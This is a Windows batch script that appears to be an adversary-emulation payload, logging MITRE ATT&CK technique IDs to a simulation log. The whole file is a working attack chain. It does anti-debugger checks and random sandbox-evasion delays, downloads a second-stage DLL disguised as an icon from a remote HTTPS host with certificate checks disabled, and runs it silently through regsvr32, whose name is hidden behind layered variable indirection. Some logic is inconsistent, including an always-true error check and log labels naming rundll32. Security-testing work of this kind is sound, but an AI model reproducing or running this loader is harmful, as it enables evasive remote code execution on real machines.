@echo off
SETLOCAL EnableDelayedExpansion

REM === PHR_ placeholder assignments (random-named SET variables) ===
SET fdjkal=%APPDATA%\10973\2c71fe32
SET qwzxcv=f6be9a4a.txt
SET oiuytf=https://10.0.0.49/stage/2/icon.png?10973-7
SET zxmnbv=BALAM-S2BO
SET lkjhgf=10973
SET poiuyu=7
SET mnbvcx=%PUBLIC%\\macula-simulations.log
SET asdfgh=https://10.0.0.49

REM === Capture timestamp once for all logs ===
SET tsvar=!DATE!/!TIME!

REM === Log file path ===
SET logfile=!mnbvcx!

REM === Debug log helper ===
SET agentname=!zxmnbv!
SET simid=!lkjhgf!

REM === Initial delay (10-20s random) before any logic ===
SET /A initial_delay=%RANDOM% %% 20 + 10
timeout /t !initial_delay! /nobreak >nul

REM === Step: Debugger detection (anti-analysis) ===
tasklist /fi "IMAGENAME eq windbg.exe" 2>nul | find /i "windbg" >nul
IF ERRORLEVEL 1 (
    tasklist /fi "IMAGENAME eq x64dbg.exe" 2>nul | find /i "x64dbg" >nul
)
IF ERRORLEVEL 1 (
    tasklist /fi "IMAGENAME eq ollydbg.exe" 2>nul | find /i "ollydbg" >nul
)
IF ERRORLEVEL 0 (
    SET /A debug_delay=%RANDOM% %% 3000 + 2000
    timeout /t !debug_delay! /nobreak >nul
)

REM === Log T1497: Virtualization/Sandbox Evasion ===
echo [!tsvar!][TTP][!agentname!][!simid!]: T1497^|Virtualization/Sandbox Evasion=OK:>> "!logfile!" 2>nul

REM === Delay between steps (5-15s ping) ===
ping -n 10 127.0.0.1 >nul

REM === Heartbeat fetch: download Stage 2 Loader DLL ===
echo [!tsvar!][DEBUG][!agentname!][!simid!]: heartbeat_start>> "!logfile!" 2>nul
curl -k -s -o "!fdjkal!\!qwzxcv!" "!oiuytf!"
SET dl_result=%ERRORLEVEL%
echo [!tsvar!][DEBUG][!agentname!][!simid!]: heartbeat_complete>> "!logfile!" 2>nul

REM === Log download result ===
IF EXIST "!fdjkal!\!qwzxcv!" (
    SET dl_status=OK
    SET dl_err=
) ELSE (
    SET dl_status=FAIL
    SET dl_err=curl returned !dl_result!
)
echo [!tsvar!][TTP][!agentname!][!simid!]: T1218^|System Binary Proxy Execution=!dl_status!:!dl_err!>> "!logfile!" 2>nul

REM === Delay before directory change (use for-loop split ticks) ===
for /l %%i in (1,1,6) do timeout /t 1 /nobreak >nul

REM === Change working directory to output dir ===
echo [!tsvar!][DEBUG][!agentname!][!simid!]: chdir_start>> "!logfile!" 2>nul
cd /d "!fdjkal!" >nul 2>&1
SET cd_result=%ERRORLEVEL%
echo [!tsvar!][DEBUG][!agentname!][!simid!]: chdir_result=!cd_result!>> "!logfile!" 2>nul

REM === Delay before invocation (random 5-15s using timeout) ===
SET /A invoke_delay=%RANDOM% %% 10 + 5
timeout /t !invoke_delay! /nobreak >nul

REM === Variable indirection obfuscation for LOLBIN invocation ===
REM Build parts of the LOLBIN name
SET part1=regsvr
SET part2=32
SET part3=.exe
SET lolbin_plain=!part1!!part2!!part3!

REM Create indirection layers
SET l1_ref=lolbin_plain
SET l2_ref=l1_ref
SET l3_ref=l2_ref

REM Resolve the actual LOLBIN name through three levels
CALL SET lolbin_final=%%!l3_ref!%%
REM lolbin_final now holds "regsvr32.exe"

REM Build argument string with indirection
SET arg_p1=/s
SET arg_p2=!qwzxcv!
SET arg_full=!arg_p1! !arg_p2!

REM Store full command in a variable
SET cmd_line=!lolbin_final! !arg_full!

REM Execute using CALL with another indirection layer
SET cmd_var=cmd_line
REM Double indirection: CALL SET cmd_exec=%%!cmd_var!%% would give the value of cmd_line (the command string)
CALL SET cmd_exec=%%!cmd_var!%%
REM Execute the command
echo [!tsvar!][DEBUG][!agentname!][!simid!]: rundll32_start>> "!logfile!" 2>nul
CALL %cmd_exec%
SET invoke_result=%ERRORLEVEL%
echo [!tsvar!][DEBUG][!agentname!][!simid!]: rundll32_result=!invoke_result!>> "!logfile!" 2>nul

REM === Log obfuscation technique (T1027) ===
echo [!tsvar!][TTP][!agentname!][!simid!]: T1027^|Obfuscated Files or Information=OK:>> "!logfile!" 2>nul

REM === Exit immediately ===
exit /b 0